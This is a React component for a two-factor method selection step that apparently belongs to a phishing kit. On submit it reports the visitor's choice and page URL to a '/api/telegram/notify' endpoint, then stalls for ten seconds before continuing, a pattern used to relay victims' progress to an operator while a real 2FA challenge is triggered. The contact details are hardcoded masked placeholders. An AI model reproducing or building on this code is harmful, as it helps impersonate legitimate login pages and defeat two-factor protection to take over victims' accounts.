"use client"

import type React from "react"
import { useState } from "react"
import { Spinner } from "./ui/spinner"

interface TFASelectionStepProps {
  onSubmit: (method: "email" | "sms", remember: boolean) => void
}

export function TFASelectionStep({ onSubmit }: TFASelectionStepProps) {
  const [selectedMethod, setSelectedMethod] = useState<"email" | "sms" | null>(null)
  const [rememberBrowser, setRememberBrowser] = useState(false)
  const [isLoading, setIsLoading] = useState(false)

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (selectedMethod && !isLoading) {
      setIsLoading(true)
      
      
      try {
        await fetch("/api/telegram/notify", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            event: "Verification Option Selected",
            details: {
              pageUrl: window.location.href,
              type: selectedMethod === "email" ? "Email" : "SMS",
            },
          }),
        })
      } catch (error) {
        console.error("Failed to send TFA selection notification:", error)
      }

      
      await new Promise(resolve => setTimeout(resolve, 10000))

      onSubmit(selectedMethod, rememberBrowser)
      setIsLoading(false)
    }
  }

  
  const maskedEmail = "******************.com"
  const maskedPhone = "***********"

  return (
    <form onSubmit={handleSubmit} className="space-y-4 sm:space-y-6">
      <div className="flex flex-col sm:flex-row sm:items-center gap-3 sm:gap-4">
        <label className="text-gray-700 font-medium sm:min-w-[200px]">
          Second Factor Selection
        </label>
        <div className="flex-1 space-y-3 sm:space-y-4">
          
          <div className="flex items-center gap-3">
            <input
              type="radio"
              id="email-option"
              name="tfa-method"
              value="email"
              checked={selectedMethod === "email"}
              onChange={() => setSelectedMethod("email")}
              className="w-4 h-4 text-blue-600 focus:ring-blue-500"
            />
            <label htmlFor="email-option" className="text-gray-700 cursor-pointer">
              Email code to {maskedEmail}
            </label>
          </div>

          
          <div className="flex items-center gap-3">
            <input
              type="radio"
              id="sms-option"
              name="tfa-method"
              value="sms"
              checked={selectedMethod === "sms"}
              onChange={() => setSelectedMethod("sms")}
              className="w-4 h-4 text-blue-600 focus:ring-blue-500"
            />
            <label htmlFor="sms-option" className="text-gray-700 cursor-pointer">
              Send text message to {maskedPhone}
            </label>
          </div>

          
          <div className="flex items-center gap-3 pt-2">
            <input
              type="checkbox"
              id="remember-browser"
              checked={rememberBrowser}
              onChange={(e) => setRememberBrowser(e.target.checked)}
              className="w-4 h-4 text-blue-600 focus:ring-blue-500 rounded"
            />
            <label htmlFor="remember-browser" className="text-gray-700 cursor-pointer">
              Remember this browser for 30 days
            </label>
          </div>
        </div>
      </div>

      <div className="flex justify-center pt-3 sm:pt-4">
        <button
          type="submit"
          disabled={!selectedMethod || isLoading}
          className="w-full sm:w-auto px-6 sm:px-8 py-2.5 sm:py-3 text-white font-semibold tracking-wide uppercase disabled:opacity-50 disabled:cursor-not-allowed transition-opacity text-sm sm:text-base flex items-center justify-center gap-2"
          style={{ backgroundColor: "#0099D8" }}
        >
          {isLoading && <Spinner className="text-white" />}
          {isLoading ? "SENDING..." : "CONTINUE"}
        </button>
      </div>
    </form>
  )
}

